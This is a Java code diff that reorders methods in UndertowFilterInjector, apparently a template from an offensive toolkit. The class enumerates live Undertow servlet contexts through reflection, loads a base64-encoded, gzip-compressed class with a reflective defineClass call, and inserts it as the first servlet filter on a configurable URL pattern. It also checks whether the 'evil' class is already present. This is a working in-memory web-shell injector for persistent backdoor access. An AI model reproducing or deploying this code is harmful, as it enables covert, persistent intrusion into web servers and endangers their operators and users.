@@ -19,22 +19,10 @@ import java.util.zip.GZIPInputStream;
  */
 public class UndertowFilterInjector {
 
-    public String getUrlPattern() {
-        return "{{urlPattern}}";
-    }
-
-
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() throws IOException {
-        return "{{base64Str}}";
-    }
-
     static {
         new UndertowFilterInjector();
     }
+
 
     public UndertowFilterInjector() {
         try {
@@ -46,79 +34,6 @@ public class UndertowFilterInjector {
         } catch (Exception ignored) {
         }
     }
-
-    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
-        List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
-        for (Thread thread : threads) {
-            try {
-                Object requestContext = invokeMethod(thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
-                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
-                if (servletContext != null) {
-                    contexts.add(servletContext);
-                }
-            } catch (Exception ignored) {
-            }
-        }
-        return contexts;
-    }
-
-    private Object getFilter(Object context) {
-        Object filter = null;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
-        try {
-            filter = classLoader.loadClass(getClassName()).newInstance();
-        } catch (Exception e) {
-            try {
-                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
-                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                defineClass.setAccessible(true);
-                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                filter = clazz.newInstance();
-            } catch (Throwable ignored) {
-            }
-        }
-        return filter;
-    }
-
-    public void addFilter(Object context, Object filter) {
-        String filterClassName = filter.getClass().getName();
-        try {
-            if (isInjected(context, filterClassName)) {
-                return;
-            }
-            Class<?> filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo");
-            Object deploymentInfo = getFV(context, "deploymentInfo");
-            Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(filterClassName, filter.getClass());
-            invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
-            Object deploymentImpl = getFV(context, "deployment");
-            Object managedFilters = invokeMethod(deploymentImpl, "getFilters");
-            invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
-            invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, filterClassName, getUrlPattern(), DispatcherType.REQUEST});
-        } catch (Throwable e) {
-            e.printStackTrace();
-        }
-    }
-
-    @SuppressWarnings("unchecked")
-    public boolean isInjected(Object context, String evilClassName) throws Exception {
-        Map<String, Object> filters = (HashMap<String, Object>) getFV(getFV(context, "deploymentInfo"), "filters");
-        if (filters != null) {
-            for (Map.Entry<String, Object> filter : filters.entrySet()) {
-                Class<?> filterClass = (Class<?>) getFV(filter.getValue(), "filterClass");
-                if (filterClass != null) {
-                    if (filterClass.getName().equals(evilClassName)) {
-                        return true;
-                    }
-                }
-            }
-        }
-        return false;
-    }
-
 
     @SuppressWarnings("all")
     static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
@@ -132,7 +47,6 @@ public class UndertowFilterInjector {
             return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
         }
     }
-
 
     @SuppressWarnings("all")
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
@@ -221,5 +135,89 @@ public class UndertowFilterInjector {
                 throw new RuntimeException(e.getMessage());
             }
         }
+    }
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
+
+    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
+        List<Object> contexts = new ArrayList<Object>();
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
+        for (Thread thread : threads) {
+            try {
+                Object requestContext = invokeMethod(thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
+                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
+                if (servletContext != null) {
+                    contexts.add(servletContext);
+                }
+            } catch (Exception ignored) {
+            }
+        }
+        return contexts;
+    }
+
+    private Object getFilter(Object context) {
+        Object filter = null;
+        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+        if (classLoader == null) {
+            classLoader = context.getClass().getClassLoader();
+        }
+        try {
+            filter = classLoader.loadClass(getClassName()).newInstance();
+        } catch (Exception e) {
+            try {
+                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                defineClass.setAccessible(true);
+                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+                filter = clazz.newInstance();
+            } catch (Throwable ignored) {
+            }
+        }
+        return filter;
+    }
+
+    public void addFilter(Object context, Object filter) {
+        String filterClassName = filter.getClass().getName();
+        try {
+            if (isInjected(context, filterClassName)) {
+                return;
+            }
+            Class<?> filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo");
+            Object deploymentInfo = getFV(context, "deploymentInfo");
+            Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(filterClassName, filter.getClass());
+            invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
+            Object deploymentImpl = getFV(context, "deployment");
+            Object managedFilters = invokeMethod(deploymentImpl, "getFilters");
+            invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
+            invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, filterClassName, getUrlPattern(), DispatcherType.REQUEST});
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+    }
+
+    @SuppressWarnings("unchecked")
+    public boolean isInjected(Object context, String evilClassName) throws Exception {
+        Map<String, Object> filters = (HashMap<String, Object>) getFV(getFV(context, "deploymentInfo"), "filters");
+        if (filters != null) {
+            for (Map.Entry<String, Object> filter : filters.entrySet()) {
+                Class<?> filterClass = (Class<?>) getFV(filter.getValue(), "filterClass");
+                if (filterClass != null) {
+                    if (filterClass.getName().equals(evilClassName)) {
+                        return true;
+                    }
+                }
+            }
+        }
+        return false;
     }
 }
